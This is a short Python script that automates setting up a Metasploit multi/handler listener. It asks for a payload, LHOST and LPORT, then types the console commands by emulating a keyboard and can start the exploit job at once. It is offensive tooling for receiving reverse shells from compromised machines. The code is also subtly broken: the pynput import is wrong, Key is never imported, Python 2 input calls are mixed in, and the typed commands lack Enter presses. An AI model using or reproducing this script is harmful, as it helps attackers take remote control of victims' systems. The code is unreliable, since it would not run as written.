import os, time
from pynput import Keyboard, Controller

keyboard = Controller()

os.system("clear")
payload = raw_input("What payload are you going to be using? ")
os.system("clear")
ip = raw_input("What is your LHOST? ")
os.system("clear")
port = raw_input("What is your LPORT? ")
os.system("clear")
exploit = raw_input("Do you want to run the exploit immediately? (Y/N) ")
exploitTwo = exploit.lower()

os.system("msfconsole")
time.sleep(10)
keyboard.type("use exploit/multi/handler")
keyboard.type("set payload " + payload)
keyboard.type("set LHOST " + ip)
keyboard.type("set lport " + port)
if exploitTwo == "y":
    keyboard.type("exploit -j -z")
    keyboard.press(Key.enter)
elif exploitTwo == "n":
    pass
else:
    print("That is not a valid response.")


# os.system("msfconsole")
# time.sleep(10)
# os.system("use exploit/multi/handler")
# os.system("set payload " + payload)
# os.system("set LHOST " + ip)
# os.system("set lport " + port)
# if exploitTwo == "y":
#     os.system("exploit -j -z")
# elif exploitTwo == "n":
#     pass

# else:
#     print("That is not an allowed response.")